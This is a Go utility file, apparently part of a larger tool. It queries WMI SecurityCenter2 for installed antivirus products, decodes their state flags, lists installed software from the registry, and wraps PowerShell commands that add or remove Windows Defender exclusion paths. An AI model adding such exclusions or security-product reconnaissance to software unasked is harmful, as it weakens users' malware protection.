package util

import (
	"fmt"
)

const (
	upMask = 1 << iota
	enMask

	wmiCommand = "$i=(Get-CimInstance -n root/SecurityCenter2 -cl %s);foreach($v in $i){$v.displayName;$v.productState}"
	softKeys   = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
	addExCmd   = "Add-MpPreference -ExclusionPa '%s'"
	rmExCmd    = "Remove-MpPreference -ExclusionPa '%s'"
)

type anti struct {
	name  string
	state byte
}

func ParseAntiState(state int) byte {
	tmp := fmt.Sprintf("0%x", state)
	var r byte
	if tmp[2:4] == "11" || tmp[2:4] == "01" || tmp[2:4] == "10" {
		r |= enMask
	}
	if tmp[4:] == "00" {
		r |= upMask
	}
	if state == 393472 {
		r = 1
	}
	//fmt.Printf("%d\t%s [%s] [%s] --> %b\n", state, tmp, tmp[2:4], tmp[4:], r)
	return r
}
func ParseAntisByClass(class string) []*anti {
	return parseAntisByClass(class)
}

func CondenseAntiList(antis []*anti) map[string]byte {
	so := map[string]byte{}

	for _, v := range antis {
		so[v.name] |= v.state
	}

	return so
}

// AVInfo returns information about installed antivirus products.
func AntiInfo() string {
	return antiInfo()
}

func SoftwareInfo() string {
	return softwareInfo()
}

func AddDefenderExclusion(path string) error {
	return addDefenderExclusion(path)
}

func RemoveDefenderExclusion(path string) error {
	return removeDefenderExclusion(path)
}
